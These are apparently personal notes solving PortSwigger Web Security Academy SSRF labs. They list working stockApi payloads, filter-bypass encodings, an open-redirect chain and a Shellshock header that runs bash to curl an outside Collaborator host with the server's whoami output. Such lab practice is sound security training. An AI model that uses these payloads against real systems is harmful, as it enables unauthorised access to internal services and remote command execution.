## LAB payloads
#### Basic SSRF against the local server
- look at stockApi parameter
- find that it has url
- change it to:
``` 
stockApi=http://localhost/admin/delete?username=carlos
```

#### Basic SSRF against another back-end system
- look at stockApi parameter
- find that it has url http://192.168.0.1:8080 ....
- brute it using intruder
- find request with 200 response code
- delete carlos **admin/delete?username=carlos**

#### SSRF with blacklist-based input filter
- look at stockApi parameter
- find that it has url 
- find that 127.1 is working, but 127.1/admin is blocked
- change admin to Admin
```
stockApi=http://127.1/Admin/delete?username=carlos
```
- or double encode
```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

#### SSRF with whitelist-based input filter
- find that that localhost+@+domain+port is working for stockApi
- add /admin/ after localhost and use double encoding for it
```
stockApi=http://localhost/admin/@stock.weliketoshop.net:8080
stockApi=http%3A%2F%2Flocalhost%25%32%66%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%66@stock.weliketoshop.net%3A8080
```
- find that admin panel appeared in response
```
stockApi=http://localhost/admin/@stock.weliketoshop.net:8080/admin/delete?username=carlos
stockApi=http%3A%2F%2Flocalhost%25%32%66%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%66@stock.weliketoshop.net%3A8080/admin/delete?username=carlos
```
or
1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
3. Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
4. Append a # to the username and observe that the URL is now rejected.
5. Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
6. To access the admin interface and delete the target user, change the URL to: http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

#### SSRF with filter bypass via open redirection vulnerability
- find nextProduct functionality, find a path parameter
```
/product/nextProduct?…&path=…
```
- find that you are redirected to a path provided (i.e **..path=/product?productId=2**)
- find that if you provide nextProduct url to stockApi you will be redirected to a path provided:
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

#### Blind SSRF with out-of-band detection
- change referer header to collab
```
Referer: http://...oastify.com
```

#### Blind SSRF with Shellshock exploitation
- https://github.com/DrHaitham/CVE-2014-6271-Shellshock-
- idea:
  - use referer to brute and request internal server
  - use shelshock to curl collab with whoami
```
GET /product?productId=2 HTTP/2
Host: ...web-security-academy.net
...
User-Agent: () { :; }; echo; echo BurpTest; /bin/bash -c "curl http://$(whoami).COLLAB.oastify.com"
...
Referer: http://192.168.0.§1§:8080
...
```
- using intruder brute all IPs and find request with whoami

or
- In Burp Suite Professional, install the Collaborator Everywhere extension from the BApp Store. 
- Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it. 
- Browse the site. 
- Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer 
  header. 
- then repeat attack using intruder